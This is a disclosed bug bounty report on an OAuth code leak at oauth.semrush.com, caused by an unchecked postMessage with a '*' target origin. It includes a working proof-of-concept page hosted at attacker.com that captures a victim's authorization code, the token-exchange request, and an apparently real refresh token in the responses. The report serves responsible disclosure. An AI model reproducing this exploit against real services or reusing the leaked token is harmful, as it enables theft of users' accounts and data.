# [oauth token leak] at oauth.semrush.com

## Report Details
- **Report ID**: 314814
- **URL**: https://hackerone.com/reports/314814
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-10T19:34:59.147Z
- **Disclosed**: 2018-04-17T11:58:56.526Z

## Reporter
- **Username**: nikitastupin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
Domain, site, application
---
oauth.semrush.com

Steps to reproduce
---
1) Create following html at attacker.com/postmessage.html

```
<script>
  function listener(event) {
    alert(JSON.stringify(event.data));
  }

  var dest = window.open("https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962");
  
  window.addEventListener("message", listener);
</script>
```
2) Go to attacker.com/postmessage.html (make sure you are logged in at www.semrush.com)
3) Click "Approve"
4) Go to tab with attacker.com, you will see alert with `code`
5) Make POST request with obtained `code`
```
POST /oauth2/access_token HTTP/1.1
Host: oauth.semrush.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 205
DNT: 1
Connection: close

client_id=seoquake&client_secret=██████████&grant_type=authorization_code&code=[COPY OBTAINED CODE HERE]&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess
```
6) Receive response with `access token` and `refresh token`
```
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json
Connection: close
Cache-Control: no-cache
Date: Sat, 10 Feb 2018 19:06:38 GMT
Set-Cookie: session=████; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly

{"access_token":"███████","token_type":"Bearer","expires_in":604800,"refresh_token":"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC"}
```

Actual results
---
`access token` and `refresh token` of victim:
```
{"access_token":"██████████","token_type":"Bearer","expires_in":604800,"refresh_token":"kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC"}
```

PoC, exploit code, screenshots, video, references, additional resources
---
This vulnerability is possible due to lack of `window.opener` origin check at `https://oauth.semrush.com/oauth2/success`:
```
<script>
	if (window.opener && typeof opener.postMessage === 'function') {
		opener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*');
	}
</script>
```
Meaning any site that opens `https://oauth.semrush.com/oauth2/success` may read `code` in `location.href`.

Attack vector based on fact that user sees SEOquake authorization page F262215 thinking that it's just official application permission request and with high probability clicks "Approve".

Still working at vector without this small user interaction.

## Impact

OAuth tokens leakage. This leads to user sensitive information leakage.
**Note**: it's not necessary to install SEOquake plugin!

P.S.
---
I'm aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.

I've reported vulnerability as soon as possible therefore no time to deeper scope research.

## Attachments
- approve.png
